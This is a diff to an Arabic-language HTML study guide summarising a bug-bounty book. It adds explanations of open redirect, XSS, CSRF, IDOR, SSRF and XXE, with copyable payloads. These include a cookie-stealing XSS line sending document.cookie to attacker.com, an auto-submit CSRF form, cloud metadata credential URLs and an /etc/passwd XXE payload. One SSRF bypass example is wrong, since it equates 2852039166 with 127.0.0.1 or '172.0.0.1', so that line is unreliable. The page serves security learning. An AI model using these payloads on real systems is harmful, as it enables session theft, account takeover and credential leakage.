@@ -555,43 +555,135 @@
         <!-- Section 1 -->
         <section id="rw-intro" class="content-sec">
           <h2 class="sec-title">1. مقدمة وكيفية قراءة تقارير الثغرات (Analyzing Real Reports)</h2>
-          <p>يشرح هذا الفصل الأهمية القصوى لدراسة تقارير الثغرات العامة المنشورة من قبل باحثين آخرين على منصات مثل HackerOne لمعرفة مسارات المطورين المعتادة في ارتكاب الأخطاء.</p>
+          <p>يؤكد الكاتب <strong>Peter Yaworski</strong> في هذا الفصل التمهيدي على أن صيد الثغرات (Bug Hunting) ليس مجرد ضرب من العشوائية، بل هو عملية منهجية تبدأ من فهم كيفية قراءة وتحليل تقارير الثغرات العامة (Public Disclosure Reports) المنشورة على منصات مثل HackerOne و Bugcrowd.</p>
+          <div class="key-point">
+            <strong>💡 الفلسفة الأمنية للكاتب:</strong>
+            المطورون يكررون نفس الأخطاء البرمجية مراراً وتكراراً. دراسة التقارير العامة تمنحك "الخارطة الذهنية" لكيفية تفكير المهاجم وكيفية ارتكاب المطورين للأخطاء في بيئات عمل حقيقية (مثل Slack, Yahoo, Twitter).
+          </div>
+          <h3 class="sub-sec-title">خطوات تفكيك تقرير ثغرة أمنية أصلية:</h3>
+          <ol>
+            <li><strong>تحديد نقطة الدخول (Entry Point):</strong> ما هي الصفحة، النموذج، أو المعامل (Parameter) الذي تم استهدافه؟</li>
+            <li><strong>تتبع آلية عمل الاستغلال (PoC Flow):</strong> كيف استطاع الباحث خداع خوارزميات التحقق من المدخلات؟</li>
+            <li><strong>تحليل الأثر الأمني (Impact):</strong> هل تمكن المهاجم من القراءة فقط، أم الكتابة وتخطي الصلاحيات بالكامل؟</li>
+          </ol>
         </section>
 
         <!-- Section 2 -->
         <section id="rw-openredirect" class="content-sec">
           <h2 class="sec-title">2. ثغرات التحويل المفتوح Open Redirect</h2>
-          <p>شرح لكيفية تصفية وتجاوز حمايات الـ Redirect المعتمدة على النطاقات الفرعية، وحقن روابط خارجية بالهندسة الاجتماعية.</p>
+          <p>تنشأ ثغرات التحويل المفتوح عندما يستقبل التطبيق مدخلاً من المستخدم (مثل رابط تحويل بعد تسجيل الدخول) ويقوم بالتحويل إليه مباشرة دون التحقق من نطاق هذا الرابط، مما يسهل عمليات التصيد الاحتيالي (Phishing).</p>
+          <h3 class="sub-sec-title">البارامترات الشائعة للبحث والتهيئة:</h3>
+          <div class="code-box">
+            <button class="copy-btn" onclick="copyCode(this)">نسخ المعاملات</button>
+            <pre>?next=http://attacker.com
+?redirect_to=https://attacker.com
+?url=//attacker.com
+?destination=https://attacker.com/login</pre>
+          </div>
+          <h3 class="sub-sec-title">طرق تخطي حمايات النطاقات الفرعية (Bypass Techniques):</h3>
+          <ul>
+            <li><strong>تخطي التصفية باستخدام الفاصل المائل العكسي (Backslash):</strong> بعض التطبيقات تبحث عن نطاقك الأصلي ولكن يمكن خداعها هكذا: <code>https://target.com@attacker.com</code></li>
+            <li><strong>تخطي التحقق بالنطاقات الفرعية المزيفة:</strong> <code>https://target.com.attacker.com</code> حيث يكون النطاق الفعلي للمهاجم.</li>
+            <li><strong>الاستغلال المتقدم مع بروتوكولات بديلة:</strong> استخدام <code>javascript:alert(1)</code> أو <code>data:text/html</code> لتوليد صفحات تصيد فورية.</li>
+          </ul>
         </section>
 
         <!-- Section 3 -->
         <section id="rw-xss" class="content-sec">
           <h2 class="sec-title">3. ثغرات حقن النص البرمجي XSS</h2>
-          <p>تحليل لحالات حقيقية تم اكتشافها في موقع Yahoo و Slack، والتركيز على استخراج الـ Cookies وتخطي الـ CSP.</p>
+          <p>تعتبر ثغرات Cross-Site Scripting (XSS) من أخطر الثغرات التي تصيب العميل (Client-Side). تتيح للمهاجم حقن وتنفيذ أكواد JavaScript خبيثة في متصفح الضحايا.</p>
+          <div class="key-point">
+            <strong>💡 دراسة حالة Slack XSS:</strong>
+            اكتشف باحثون ثغرة XSS مخزنة في محادثات Slack عن طريق حقن كود برمجى داخل ميزات معاينة الروابط (Link Preview Generation)، مما سمح بتسريب كوكيز الجلسات بالكامل.
+          </div>
+          <h3 class="sub-sec-title">أنواع ثغرات الحقن والمواجهة:</h3>
+          <ol>
+            <li><strong>XSS المنعكس (Reflected XSS):</strong> يحقن المهاجم الكود في رابط ويرسله للضحية، لينعكس الكود فوراً من السيرفر.</li>
+            <li><strong>XSS المخزن (Stored XSS):</strong> يتم تخزين الكود الخبيث في قاعدة البيانات (مثل التعليقات أو الملف الشخصي) وينفذ لكل زائر للموقع.</li>
+            <li><strong>XSS القائم على الـ DOM:</strong> خلل برمجي في أكواد الـ JavaScript على العميل (مثل <code>eval()</code> أو <code>innerHTML</code>).</li>
+          </ol>
+          <h3 class="sub-sec-title">أكواد بايلودز متطورة لتخطي الفلاتر:</h3>
+          <div class="code-box">
+            <button class="copy-btn" onclick="copyCode(this)">نسخ الأكواد</button>
+            <pre>&lt;svg onload="fetch('http://attacker.com/log?c='+document.cookie)"&gt;
+&lt;img src=x onerror="javascript:alert(1)"&gt;
+&lt;iframe src="javascript:alert(document.domain)"&gt;&lt;/iframe&gt;</pre>
+          </div>
         </section>
 
         <!-- Section 4 -->
         <section id="rw-csrf" class="content-sec">
           <h2 class="sec-title">4. ثغرات تزوير الطلب CSRF</h2>
-          <p>كيفية استغلال عدم وجود حماية ضد الـ CSRF في تغيير البيانات الشخصية وحسابات الدفع وتخطي الـ API Keys.</p>
+          <p>تتيح ثغرة Cross-Site Request Forgery (CSRF) للمهاجم إجبار متصفح المستخدم المصادق (Authenticated User) على تنفيذ طلبات غير مرغوب فيها في تطبيق ويب يثق فيه الضحية (مثل تغيير البريد الإلكتروني أو تحويل أموال).</p>
+          <h3 class="sub-sec-title">آلية الاستغلال ونموذج هجوم تلقائي (Auto-Submit Form):</h3>
+          <p>يقوم المهاجم ببناء نموذج HTML مخفي في موقعه ويجعل متصفح الضحية يرسله تلقائياً إلى التطبيق المستهدف:</p>
+          <div class="code-box">
+            <button class="copy-btn" onclick="copyCode(this)">نسخ كود الهجوم</button>
+            <pre>&lt;form action="https://target.com/api/v1/update-email" method="POST" id="csrfForm"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com" /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.getElementById('csrfForm').submit();
+&lt;/script&gt;</pre>
+          </div>
+          <h3 class="sub-sec-title">تقنيات تخطي حمايات الـ CSRF:</h3>
+          <ul>
+            <li><strong>تغيير طريقة الطلب (Method Switching):</strong> تحويل طلب الـ POST الذي يتطلب توكن إلى طلب GET لا يتحقق من الـ Token.</li>
+            <li><strong>حذف توكن الـ CSRF بالكامل:</strong> بعض السيرفرات تتحقق من التوكن فقط إذا كان موجوداً في الطلب!</li>
+            <li><strong>استغلال قيم التوكن الفارغة أو الضعيفة التشفير.</strong></li>
+          </ul>
         </section>
 
         <!-- Section 5 -->
         <section id="rw-idor" class="content-sec">
           <h2 class="sec-title">5. ثغرات IDOR وتخطي الصلاحيات</h2>
-          <p>من أكثر الثغرات شيوعاً وقبولاً في برامج الـ Bug Bounty. يعلمك الكاتب كيفية التحقق من صلاحيات الـ backend عن طريق تغيير الـ Parameters.</p>
+          <p>ثغرات Insecure Direct Object Reference (IDOR) تحدث عندما يستعين التطبيق بمعرفات رقمية أو أسماء كائنات مباشرة لجلب البيانات دون التأكد من أن المستخدم الحالي يمتلك صلاحية الوصول لهذا الكائن.</p>
+          <div class="benefit-box">
+            <strong>🛡️ أثر الثغرة:</strong> تخريب وقراءة الحسابات الأخرى، الوصول للفواتير والملفات الحساسة لآلاف المشتركين دفعة واحدة عبر تغيير رقم الـ ID بشكل تسلسلي.
+          </div>
+          <h3 class="sub-sec-title">طريقة التحقق وفحص الثغرات:</h3>
+          <p>1. قم بإنشاء حسابين (حساب أ وحساب ب).</p>
+          <p>2. سجل الدخول بالحساب أ وراقب الطلبات المرسلة لجلب إعدادات حسابك.</p>
+          <p>3. قم باستبدال الـ ID الخاص بك بالـ ID التابع للحساب ب في طلب الـ GET/POST الأمني. إذا استجاب السيرفر بالمعلومات، فهناك ثغرة IDOR مؤكدة!</p>
         </section>
 
         <!-- Section 6 -->
         <section id="rw-ssrf" class="content-sec">
           <h2 class="sec-title">6. ثغرات SSRF وتسريب السحاب</h2>
-          <p>استعراض لكيفية وصول المهاجم لمعلومات الـ Metadata لسيرفرات AWS و Google Cloud عن طريق إجبار السيرفر على جلب طلبات خارجية.</p>
+          <p>ثغرة Server-Side Request Forgery (SSRF) تمكن المهاجم من إجبار خادم الويب المستهدف على إرسال طلبات HTTP إلى شبكته الداخلية أو إلى خدمات خارجية غير مصرح له بالوصول إليها.</p>
+          <h3 class="sub-sec-title">استهداف بيئات السحابة وتسريب مفاتيح الـ Metadata:</h3>
+          <p>مقدمو السحاب (مثل AWS, GCP, Azure) يمتلكون واجهات برمجية داخلية مخفية لا تتطلب توثيقاً للمصادقة وتخزن مفاتيح التشفير والتحكم بالسيرفر. العنوان الشهير الموحد لمعظم البيئات السحابية هو <code>169.254.169.254</code>.</p>
+          <div class="code-box">
+            <button class="copy-btn" onclick="copyCode(this)">نسخ عناوين الميتاداتا</button>
+            <pre># AWS EC2 Metadata Request
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud Metadata Request (Requires metadata-flavor header usually)
+http://metadata.google.internal/computeMetadata/v1/instance/disks/</pre>
+          </div>
+          <h3 class="sub-sec-title">طرق تخطي حمايات الـ Localhost (SSRF Bypass):</h3>
+          <ul>
+            <li>تحويل الـ IP إلى نظام ثماني أو عشري: <code>http://2852039166/</code> يعادل الـ IP الداخلي <code>172.0.0.1</code> أو <code>127.0.0.1</code>.</li>
+            <li>استغلال خدمة DNS Rebinding لتحويل النطاق إلى الـ Localhost أثناء معالجة الطلب.</li>
+          </ul>
         </section>
 
         <!-- Section 7 -->
         <section id="rw-xxe" class="content-sec">
           <h2 class="sec-title">7. ثغرات XXE ومعالجة XML الحساسة</h2>
-          <p>قراءة ملفات النظام الداخلية وقاعدة البيانات عن طريق معالجة ملفات XML ضعيفة التهيئة والتسبب بحجب الخدمة DoS.</p>
+          <p>ثغرات XML External Entity (XXE) تصيب محللات ومعالجات ملفات الـ XML الضعيفة التكوين، وتسمح للمهاجم بتعريف كيانات خارجية لقراءة ملفات النظام الداخلية أو إجراء اتصالات خارجية.</p>
+          <h3 class="sub-sec-title">بايلود قراءة ملفات السيرفر الداخلية (LFI via XXE):</h3>
+          <p>يحقن المهاجم الكود التالي في ملف الـ XML المرفوع للسيرفر لاستخراج ملف المستخدمين في أنظمة Linux:</p>
+          <div class="code-box">
+            <button class="copy-btn" onclick="copyCode(this)">نسخ بايلود XXE</button>
+            <pre>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
+&lt;!DOCTYPE foo [  
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; 
+]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+&lt;/stockCheck&gt;</pre>
+          </div>
         </section>
 
         <!-- Section 8 -->
